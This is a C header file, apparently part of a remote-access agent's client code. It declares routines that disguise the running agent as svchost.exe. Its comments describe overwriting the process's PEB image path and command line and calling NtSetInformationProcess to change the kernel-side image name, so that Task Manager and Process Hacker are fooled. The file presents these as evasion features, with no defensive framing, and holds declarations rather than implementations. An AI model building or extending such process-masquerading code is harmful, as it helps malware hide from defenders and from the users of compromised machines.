/*
 * client/spoof.h  –  Process-identity spoofing declarations
 * ===========================================================
 * Three user-mode evasion routines that disguise the agent as svchost.exe
 * to casual inspection.  All are no-ops on failure — the agent continues
 * running even if a spoof call is denied.
 *
 *  spoof_peb()
 *      Overwrites RTL_USER_PROCESS_PARAMETERS.ImagePathName and .CommandLine
 *      so tools that read the PEB (Task Manager command-line column,
 *      Process Hacker Properties > Image) see a benign svchost.exe path.
 *
 *  spoof_kernel_image()
 *      Calls NtSetInformationProcess(49 = ProcessImageFileName) to replace
 *      the kernel-side image name string with svchost.exe.  This is the
 *      string that Process Hacker reads for its "Image" column.
 *
 *  unlink_self_from_ldr()
 *      Currently a no-op stub (LDR pointer arithmetic was unstable across
 *      Windows builds).  Kept as a hook for future implementation.
 */

#pragma once
#ifndef CLIENT_SPOOF_H
#define CLIENT_SPOOF_H

#ifdef __cplusplus
extern "C" {
#endif

void spoof_peb(void);
void spoof_kernel_image(void);
void unlink_self_from_ldr(void);

#ifdef __cplusplus
}
#endif
#endif /* CLIENT_SPOOF_H */
